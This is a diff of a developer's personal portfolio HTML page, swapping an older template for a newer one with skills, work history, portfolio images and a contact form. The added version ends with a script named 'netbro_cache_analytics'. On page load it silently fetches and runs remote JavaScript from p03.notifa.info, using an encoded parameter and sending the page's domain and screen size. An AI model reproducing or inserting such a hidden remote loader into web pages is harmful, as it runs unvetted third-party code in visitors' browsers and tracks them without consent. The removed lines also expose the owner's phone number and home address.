@@ -1,321 +1,371 @@
-﻿<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html lang="en">
+
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="" />
-    <meta name="author" content="" />
-    <!--[if IE]>
-        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-        <![endif]-->
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no, width=device-width" />
     <title>Riventus</title>
     <!-- ICON web -->
-    <link rel="shortcut icon" href="assets/img/riventus.ico">
+    <link rel="shortcut icon" href="assets2/img/riventus.ico">
+    <!-- <link rel="shortcut icon" href="favicon.png" /> -->
+    <link href='http://fonts.googleapis.com/css?family=Lato:300,400,700' rel='stylesheet' type='text/css'>
+    <link href="assets3/style/all.min.css" rel="stylesheet" type="text/css" />
+    <script src="assets3/js/jquery-1.9.1.min.js" type="text/javascript"></script>
+    <script src="assets3/js/modernizr-2.6.2.min.js" type="text/javascript"></script>
+    <!--[if lt IE 9]><script src="js/html5.js"></script><![endif]-->
+    <!--[if IE]><style>.timeline li{display:block;-ms-filter: "progid: DXImageTransform.Microsoft.Alpha(Opacity=100)";filter: alpha(opacity=100);opacity: 1;}</style><![endif]-->
+    <style type="text/css">
+    	canvas{
+    		position: absolute; 
+    	}
 
-    <!-- BOOTSTRAP CORE STYLE  -->
-    <link href="assets/css/bootstrap.css" rel="stylesheet" />
-    <!-- FONT AWESOME ICON STYLE  -->
-    <link href="assets/css/font-awesome.css" rel="stylesheet" />
-    <!-- PRETTYPHOTO STYLE  -->
-    <link href="assets/css/prettyPhoto.css" rel="stylesheet" />
-    <!-- CUSTOM STYLE CSS -->
-    <link href="assets/css/style.css" rel="stylesheet" />
-    <!-- CUSTOM THEME COLOR - YOU CAN USE LIGHT & DARK THEMES  -->
-    <link href="assets/css/themes/light.css" rel="stylesheet" />
-    <!-- GOOGLE FONT -->
-    <link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
+    </style>
 </head>
-<body>
-    <div class="navbar navbar-inverse navbar-fixed-top scrollclass">
+
+<body data-spy="scroll" data-target=".navbar-flat" data-offset="55">
+    <div class="loader">
+        <div class="inner"></div>
+    </div>
+    <section id="welcome">
+    	<div id="particles-js">
+    		
+        <div id="slides">
+            <div class="overlay"></div>
+            <div class="slides-container">
+
+            	<img src="assets3/images/slides/1.jpg" alt="1">
+            	<img src="assets3/images/slides/2.jpg" alt="2">
+            	<img src="assets3/images/slides/3.jpg" alt="3"></div>
+            <nav class="slides-navigation">
+                <a href="#" class="next"></a>
+                <a href="#" class="prev"></a>
+            </nav>
+            <div class="welcome-message">
+                <div class="heading">
+                    <p>HI, I'M RIVENTUS</p>
+                    <p class="small"><kbd>BackEND</kbd> Web from IND</p>
+                </div><a href="#home" class="borderBtn scrollto">MORE ABOUT ME</a></div>
+        </div>
+    	</div>
+
+    </section>
+    <div class="navbar navbar-flat">
         <div class="container">
+
             <div class="navbar-header">
-                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-                    <span class="icon-bar"></span>
-                    <span class="icon-bar"></span>
-                    <span class="icon-bar"></span>
-                </button>
-                <a class="navbar-brand" href="#">Riventus AHA </a>
-            </div>
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a href="#" class="navbar-brand">MENU</a></div>
             <div class="navbar-collapse collapse">
-                <ul class="nav navbar-nav navbar-right">
-                    <li><a href="#home-sec">Home</a></li>
-                    <li><a href="#features-sec">Ebooks</a></li>
-                    <li><a href="#advance-sec">Tutorials</a></li>
-                    <li><a href="#gallery-sec">Projects</a></li>
-                    <li><a href="#location-sec">Location</a></li>
+                <nav>
+                    <ul class="nav navbar-nav">
+                        <li class="active"><a href="#welcome" class="scrollto">HOME</a></li>
+                        <li><a href="#about" class="scrollto">ABOUT</a></li>
+                        <li><a href="#skills" class="scrollto">SKILLS</a></li>
+                        <li><a href="#experience" class="scrollto">EXPERIENCE</a></li>
+                        <li><a href="#portfolio" class="scrollto">PORTFOLIO</a></li>
+                        <li><a href="#contact" class="scrollto">CONTACT</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    
+    <section class="hero firstSec section colored" id="home">
+    	<div class="container">
+            <div class="col-xs-6 col-md-4 profilePic">
+            	<img src="assets3/images/me.jpg" alt="" class="img-circle">
+            </div>
+            <div class="heading">
+                <h1>RIVENTUS A H ARITONANG</h1>
+                <h3>Jr. Developer - Gamers - Musician</h3><a href="https://www.visualcv.com/riventus/pdf/" class="borderBtn">DOWNLOAD RESUME</a>
+            </div>
+    	</div>
+    </section>
+    <section class="services section" id="about">
+        <div class="container">
+            <div class="divider"></div>
+            <div class="heading">
+                <h2>HERE'S WHAT I'M DOING</h2>
+                <p>I introduce the most creative and original ideas for my customers </p>
+            </div>
+            <div class="">
+                <p>Hi, It's me, Riventus from Jogja, Indonesia, nice to meet you! Thanks for see my landing page. I love programming and improve myself to be great on it. ENJOY!</p>
+            </div>
+            <div class="services-inner hidethis">
+                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+                    <p class="icon"><i class="heart"></i></p>
+                    <h3>COMMUNITY</h3></div>
+                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+                    <p class="icon"><i class="coding"></i></p>
+                    <h3>DEVELOPMENT</h3></div>
+                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+                    <p class="icon"><i class="coding"></i></p>
+                    <h3>GAMES</h3></div>
+                <div class="service col-xs-12 col-sm-6 col-md-3 col-lg-3">
+                    <p class="icon"><i class="music"></i></p>
+                    <h3>MUSIC</h3></div>
+            </div>
+        </div>
+    </section>
+    <section class="skills section colored" id="skills">
+        <div class="container">
+            <div class="divider"></div>
+            <div class="heading">
+                <h2>TECHNICAL SKILLS</h2></div>
+            <div id="skills-slide">
+                <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+                    <h4>PHOTOSHOP</h4>
+                    <p>Adobe Photoshop</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="75"><span class="percent"></span></span>
+                    <h4>HTML5</h4>
+                    <p>Develop raw frontend</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="60"><span class="percent"></span></span>
+                    <h4>CSS</h4>
+                    <p>Make style for smile</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+                    <h4>JAVASCRIPT</h4>
+                    <p>Interactive with user</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
+                    <h4>PHP</h4>
+                    <p>Dynamic data with ele<kbd>PHP</kbd>ant (Codeigniter n Laravel)</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="85"><span class="percent"></span></span>
+                    <h4>MYSQL</h4>
+                    <p>Need manage data !</p>
+                </div>
+                <div class="skill"><span class="chart" data-percent="50"><span class="percent"></span></span>
+                    <h4>PYTHON</h4>
+                    <p>I'm gonna EAT YOU !! (Django n Flask)</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="experience section" id="experience">
+        <div class="container">
+            <div class="divider"></div>
+            <div class="heading">
+                <h2>WORK EXPERIENCE</h2></div>
+            <div class="row">
+                <div class="timeline">
+                    <ul>
+                        <li class="animated">
+                            <div class="point"></div>
+                            <div class="bubble">
+                                <div class="bubble-arrow"></div>
+                                <p class="date">July 2019 - Present</p>
+                                <p class="name">PT HAYUNING INDO TECH</p>
+                                <p class="title">Backend Web Developer</p>
+                            </div>
+                        </li>
+                        <li class="animated odd">
+                            <div class="point"></div>
+                            <div class="bubble">
+                                <div class="bubble-arrow"></div>
+                                <p class="date">Oct. 2018 - June 2019</p>
+                                <p class="name">Freelance</p>
+                                <p class="title">Web Developer</p>
+                            </div>
+                        </li>
+                        <li class="animated">
+                            <div class="point"></div>
+                            <div class="bubble">
+                                <div class="bubble-arrow"></div>
+                                <p class="date">May 2018 - Sept. 2018</p>
+                                <p class="name">PT TEKNO INOVASI NUSANTARA</p>
+                                <p class="title">Jr. Web Developer</p>
+                            </div>
+                        </li>
+                        <li class="animated odd">
+                            <div class="point"></div>
+                            <div class="bubble">
+                                <div class="bubble-arrow"></div>
+                                <p class="date">Sept. 2017 - May 2018</p>
+                                <p class="name">Learned Programming</p>
+                                <p class="title">Jr. Web Developer</p>
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="portfolio section" id="portfolio">
+        <div class="container">
+            <div class="divider"></div>
+            <div class="heading">
+                <h2>PORTFOLIO</h2></div>
+            <div class="filter row">
+                <ul id="filters">
+                    <li><a href="#" data-filter="*" class="current">ALL</a></li>
+                    <li><a href="#" data-filter=".laravel">Laravel</a></li>
+                    <li><a href="#" data-filter=".inventory">Inventory</a></li>
+                    <li><a href="#" data-filter=".codeigniter">Codeigniter</a></li>
                 </ul>
             </div>
-
-        </div>
-    </div>
-    <!--END NAB BAR SECTION-->
-    <div id="home-sec">
-        <div class="overlay">
-            <div class="container">
-                <div class="col-md-8 pad-top scrollclass">
-                    <h1>
-                        <strong>Wanna something great from <mark>Riventus </mark>Backend Developer </strong>
-                    </h1>
-                    <p class="home-p">
-                        Hi, it's me, Riventus from Yogyakarta, Indonesia, nice to meet you! Thanks for see my blog,
-                        I just wanna share and learn more about application programming for a lots of things and
-                        improve myself to be great in programming language. ENJOY!
-                    </p>
-                    <a class="btn btn-primary btn-lg btn-home" href="#features-sec">Explore More &nbsp; <i class="fa fa-toggle-on"></i></a>
-                </div>
-                <div class="col-md-4 img-home-side ">
-                    <img src="assets/img/home-side.png" class="img-responsive" />
-                </div>
+            <div class="items">
+                <ul class="row portfolio-items">
+                    <li class="laravel col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/11.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/11.png" data-gallery="portfolio" title="Website Event" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="http://riventusdemo.000webhostapp.com/" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <li class="inventory col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/33.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/33.png" data-gallery="portfolio" title="Website Inventory" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="#" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <li class="codeigniter col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/22.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/22.png" data-gallery="portfolio" title="Website landing" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="#" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <li class="codeigniter col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/55.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/55.png" data-gallery="portfolio" title="Admin Panel" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="#" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <!-- <li class="illustration col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets3/images/portfolio/thumb/5.jpg" alt="">
+                            <div class="icons"><a href="assets3/images/portfolio/5.jpg" data-gallery="portfolio" title="Caption" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="#" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li> -->
+                    <li class="laravel col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/44.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/44.png" data-gallery="portfolio" title="Desc Event" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="http://riventusdemo.000webhostapp.com/description/5" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <li class="laravel col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets2/img/portfolio/66.png" alt="">
+                            <div class="icons"><a href="assets2/img/portfolio/66.png" data-gallery="portfolio" title="Panel CRUD Web Event" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="http://riventusdemo.000webhostapp.com/login" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li>
+                    <!-- <li class="laravel col-xs-6 col-sm-4 col-md-3 col-lg-3" onclick="">
+                        <div class="item"><img src="assets3/images/portfolio/thumb/8.jpg" alt="">
+                            <div class="icons"><a href="assets3/images/portfolio/8.jpg" data-gallery="portfolio" title="Caption" class="fullwidth"><i class="glyphicon glyphicon-search"></i></a><a href="#" class="projectlink" target="_blank"><i class="glyphicon glyphicon-link"></i></a></div>
+                            <div class="mask"></div>
+                        </div>
+                    </li> -->
+                </ul>
             </div>
         </div>
-
-    </div>
-    <!--END HOME SECTION-->
-    <section id="features-sec">
+    </section>
+    <section class="contact section" id="contact">
         <div class="container">
-            <div class="row text-center min-set">
-                <div class="col-md-12">
-                    <h2><mark class="head-glow">Awesome </mark>Ebooks </h2>
-                    <hr class="sub-hr" />
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-md-4 text-center">
-                    <img src="assets/img/1.png" class="img-set" />
-                    <h3>Programming Books</h3>
-                    <hr />
-                    <p>
-                        This is my programming books. Check out and feel free to download it.
-                    </p>
-                </div>
-                <div class="col-md-4 text-center">
-                    <img src="assets/img/bulb-yellow.png" class="main-img" />
-
-                </div>
-                <div class="col-md-4 text-center" style="padding-top: 10px;">
-                    <img src="assets/img/2.png" class="img-set" />
-                    <h3>Other Ebooks</h3>
-                    <hr />
-                    <p>
-                        Another ebooks such as english books, utility books, and etc.
-                    </p>
-                </div>
-            </div>
-
-        </div>
-    </section>
-    <!--END FEATURES SECTION-->
-    <section id="skill-sec">
-        <div class="overlay">
-            <h3 class="text-center">My Skill</h3>
-            <div class="container">
-                <div class="row ">
-                    <div class="col-lg-3 col-md-3 col-sm-3 text-center ">
-                        <i class="fa fa-code fa-5x"></i>
-                        <h4>HTML+CSS</h4>
-                    </div>
-                    <div class="col-lg-3 col-md-3 col-sm-3 text-center ">
-                        <i class="fa fa-gear fa-5x"></i>
-                        <h4>Codeigniter,Laravel</h4>
-                    </div>
-                    <div class="col-lg-3 col-md-3 col-sm-3 text-center ">
-                        <i class="fa fa-bullseye fa-5x"></i>
-                        <h4>Python</h4>
-                    </div>
-
-                    <div class="col-lg-3 col-md-3 col-sm-3 text-center">
-                        <i class="fa fa-list fa-5x"></i>
-                        <h4>Javascript</h4>
-                    </div>
-
+            <div class="divider"></div>
+            <div class="heading">
+                <h2>SHOOT A MESSAGE</h2></div>
+            <div class="form">
+                <div class="col-xs-12 col-sm-9 col-md-9 centered">
+                    <form action="" onSubmit="return false;" id="xhr" method="post" name="contactform" class="contactform">
+                        <input type="hidden" value="contact" name="type">
+                        <input name="send[name]" type="text" class="col-xs-12 col-sm-6 col-md-6 col-lg-6" placeholder="Your name..." data-validation="required">
+                        <input name="send[email]" type="email" class=" col-xs-12 col-sm-6 col-md-6 col-lg-6 no-margin" placeholder="Your email..." data-validation="email">
+                        <textarea name="send[message]" class="col-xs-12 col-sm-12 col-md-12 col-lg-12" placeholder="Your message..." data-validation="required"></textarea>
+                        <p>
+                            <button class="submit sendcontact">SEND MESSAGE</button>
+                        </p>
+                    </form>
+                    <p class="error"></p>
                 </div>
             </div>
         </div>
     </section>
-    <!--END SKILL SECTION-->
-    <section id="advance-sec">
+    <div><iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7911.563203809134!2d110.20775540000001!3d-7.4893502000000005!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0xc9b0a44bffee0ed9!2sOemah+Trading!5e0!3m2!1sen!2sid!4v1565628302501!5m2!1sen!2sid" width="100%" height="450" frameborder="0" style="border:0" allowfullscreen></iframe></div>
+    <div class="clear"></div>
+    <footer class="section">
         <div class="container">
-            <div class="row text-center min-set">
-                <div class="col-md-12">
-                    <h2><mark class="head-glow">Advance </mark>Tutorials </h2>
-                    <hr class="sub-hr" />
-                </div>
-            </div>
-            <div class="row">
-                <div class="col-md-4 text-center">
-                    <img src="assets/img/4.png" class="img-set" />
-                    <h3>Codeigniter</h3>
-                    <p>
-                        Tutorial using Codeigniter 3.x
-                    </p>
-                </div>
-                <div class="col-md-4 text-center">
-                    <img src="assets/img/5.png" class="img-set" />
-                    <h3>Laravel</h3>
-                    <p>
-                        Tutorial using Codeigniter 5.x
-                    </p>
-                </div>
-                <div class="col-md-4 text-center">
-                    <img src="assets/img/3.png" class="img-set" />
-                    <h3>Others</h3>
-                    <p>
-                        Other tutorial for programming such as javascript, python, etc.
-                    </p>
-                </div>
-            </div>
-
+            <p>&copy;2019 <a href="https://rhivent.github.io">Riventus</a>. All Rights Reserved.</p>
+            <ul>
+                <li>
+                    <a target="_blank" class="facebook" href="https://www.facebook.com/riventus.aritonang"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="twitter" href="https://twitter.com/riventusaha"></a>
+                </li>
+                <!-- <li>
+                    <a target="_blank" class="google" href="https://plus.google.com/"></a>
+                </li> -->
+                <li>
+                    <a target="_blank" class="linkedin" href="https://id.linkedin.com/in/riventusaritonang"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="instagram" href="https://www.instagram.com/rhivent"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="youtube" href="https://www.youtube.com/channel%2FUCBsSxrVeP_FgLlUTuRKS-tA?fbclid=IwAR0XWv_kJBs7AoJ-DtOLG4PVZAvrAAvPOjd-nJ8i7qthRRlPRQ_igAo3NYU"></a>
+                </li>
+                <!-- <li>
+                    <a target="_blank" class="vimeo" href="http://www.vimeo.com/"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="tumblr" href="http://www.tumblr.com/"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="dribbble" href="http://www.dribbble.com/"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="behance" href="https://www.behance.net/"></a>
+                </li>
+                <li>
+                    <a target="_blank" class="flickr" href="https://www.flickr.com/"></a>
+                </li> -->
+            </ul>
         </div>
-    </section>
-    <!--END ADVANCE SECTION-->
-    <div id="just-sec" style="">
-        <div class="overlay">
-            + PROJECT GALLERIES +
-        </div>
+    </footer>
+    <script src="https://maps.googleapis.com/maps/api/js?sensor=false" type="text/javascript"></script>
+    <script src="assets3/js/all.min.js" type="text/javascript"></script>
+    <script src="assets/js/particles.min.js"></script>
+    <script src="assets/js/app.js"></script>
+    <script>
+        (function(i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function() {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '../../../www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-51103185-1', 'sftheme.com');
+        ga('send', 'pageview');
+    </script>
+    <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
 
-    </div>
-    <!--END JUST SECTION-->
-    <section id="gallery-sec">
+            function sync(fn) {
+                fn();
+            }
 
-
-        <div class="container ">
-            <div class="row text-center min-set">
-                <div class="col-md-12">
-                    <h2><mark class="head-glow">Projects </mark>Section </h2>
-                    <hr class="sub-hr" />
-                </div>
-            </div>
-            <div id="port-folio">
-                <div class="row ">
-                    <ul id="filters">
-                        <li><span class="filter active" data-filter="CODEIGNITER LARAVEL OTHERS">All </span></li>
-                        <li><span class="filter">/</span></li>
-                        <li><span class="filter" data-filter="CODEIGNITER">Codeigniter</span></li>
-                        <li><span class="filter">/</span></li>
-                        <li><span class="filter" data-filter="LARAVEL">Laravel</span></li>
-                        <li><span class="filter">/</span></li>
-                        <li><span class="filter" data-filter="OTHERS">Others</span></li>
-                    </ul>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item LARAVEL mix_all" data-cat="LARAVEL">
-                            <a class="preview" href="assets/img/portfolio/11.png">
-                                <img src="assets/img/portfolio/11.png" class="img-responsive " alt="" title="Front-website-eventventus"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item CODEIGNITER mix_all" data-cat="CODEIGNITER">
-                            <a class="preview" href="assets/img/portfolio/22.png">
-                                <img src="assets/img/portfolio/22.png" class="img-responsive " alt="" title="Front-website-vinosystech"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item OTHERS mix_all" data-cat="OTHERS">
-                            <a class="preview" href="assets/img/portfolio/33.png">
-                                <img src="assets/img/portfolio/33.png" class="img-responsive " alt="" title="Point-of-Sale-App"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item LARAVEL mix_all" data-cat="LARAVEL">
-                            <a class="preview" href="assets/img/portfolio/44.png">
-                                <img src="assets/img/portfolio/44.png" class="img-responsive " alt="" title="Description-website-eventventus"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item CODEIGNITER mix_all" data-cat="CODEIGNITER">
-                            <a class="preview" href="assets/img/portfolio/55.png">
-                                <img src="assets/img/portfolio/55.png" class="img-responsive " alt="" title="Admin-website-vinosystech"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item LARAVEL mix_all" data-cat="LARAVEL">
-                            <a class="preview" href="assets/img/portfolio/66.png">
-                                <img src="assets/img/portfolio/66.png" class="img-responsive " alt="" title="Admin-website-eventventus"/>
-                            </a>
-                        </div>
-                    </div>
-
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item OTHERS mix_all" data-cat="OTHERS">
-                            <a class="preview" href="assets/img/ToDoList/API_ToDoList_1.PNG">
-                                <img src="assets/img/portfolio/ToDoList/API_ToDoList_1.PNG" class="img-responsive " alt="" title="Point-of-Sale-App"/>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item OTHERS mix_all" data-cat="OTHERS">
-                            <a class="preview" href="assets/img/ToDoList/BE_ToDoList_1.PNG">
-                                <img src="assets/img/ToDoList/BE_ToDoList_1.PNG" class="img-responsive " alt="" title="Point-of-Sale-App"/>
-                            </a>
-                        </div>
-                    </div>
-                    <div class="col-md-4 col-sm-4">
-                        <div class="portfolio-item OTHERS mix_all" data-cat="OTHERS">
-                            <a class="preview" href="assets/img/ToDoList/front_ToDoList_1.PNG">
-                                <img src="assets/img/ToDoList/front_ToDoList_1.PNG" class="img-responsive " alt="" title="Point-of-Sale-App"/>
-                            </a>
-                        </div>
-                    </div>
-
-                </div>
-
-            </div>
-        </div>
-    </section>
-    <!-- END GALLERY  SECTION -->
-
-    <section id="location-sec">
-        <div class="container">
-            <div class="row text-center min-set">
-                <div class="col-md-12">
-                    <h2><mark class="head-glow">MY </mark>LOCATION </h2>
-                    <hr class="sub-hr" />
-                </div>
-            </div>
-            <div class="row">
-
-                <div class="col-md-12 text-center">
-                    <h3>Riventus AHA</h3>
-                    <cite>+62 877 8439 2881</cite>
-                    <br />
-                    <h4>Neighbourhood 7th, Gunungan Village, Sumber Mulyo,</h4>
-                    <h4>Bambanglipuro, Bantul, Yogyakarta</h4>
-                    <h4>Indonesia</h4>
-                    <br />
-                    <a href="https://www.facebook.com/riventus.aritonang" target="_blank" style="color: #fff; font-size: 12px;">FB</a>&nbsp;
-                    <a href="https://id.linkedin.com/in/riventusaritonang" target="_blank" style="color: #fff; font-size: 12px;">Linkedin</a>&nbsp;
-                    <a href="https://github.com/rhivent" target="_blank" style="color: #fff; font-size: 12px;">Github</a>
-                </div>
-            </div>
-
-        </div>
-    </section>
-    <!-- END LOCATION  SECTION -->
-    <!-- JAVASCRIPT FILES PLACED AT THE BOTTOM TO REDUCE THE LOADING TIME  -->
-    <!-- CORE JQUERY  -->
-    <script src="assets/js/jquery-1.11.1.js"></script>
-    <!-- BOOTSTRAP SCRIPTS  -->
-    <script src="assets/js/bootstrap.js"></script>
-    <!-- PRETTYPHOTO SCRIPTS -->
-    <script src="assets/js/jquery.prettyPhoto.js"></script>
-    <!-- PORTFOLIO FILTER PLUGIN  -->
-    <script src="assets/js/jquery.mixitup.min.js"></script>
-    <!-- NICE SCROLL SCRIPTS   -->
-    <script src="assets/js/jquery.nicescroll.min.js"></script>
-    <!-- EASING SCROLL SCRIPTS   -->
-    <script src="assets/js/jquery.easing.min.js"></script>
-    <!-- CUSTOM SCRIPTS  -->
-    <script src="assets/js/custom.js"></script>
-
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2qujevZ1M%2bIaBL9O0Q6GkAQVe5uexGQ7hxJppsS4zcl8l5PJMmWyVi8qs3ZiB%2fdqSipO25YsN%2f9xhmzwLAR%2bH1%2fJBqLjLQv8Ai%2bZX6rla%2fFKlCtSBAkLsL8WyLhSVD54nEYfpaZg9p0m3v03AwO07iibpynF7zHr2Yy22LJmydWoko7UaKanPtYMiS69mM2%2fdt1ks4M%2bCDu%2b1sfgLhn%2fDzMymGgw9x7oT8xq0XOy1IaeW61z%2bzCsotEY%2bVT7pkgKe1GFh2%2bCUERVAwbluOvZ1ZQW10lH9Am9OmD%2bh8QO221rJgCcrhWxpGPxJnWpsMqKW5aIfhk4y%2bcBAyHqyxqLfxlZRjN%2bxjcf%2bkQJeXqFBoseLjMQ3aGSGUZqKLrt7oc9smt2vNb%2bQFFGrmjjf4LaD1w%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
+    </script>
 </body>
+
 </html>
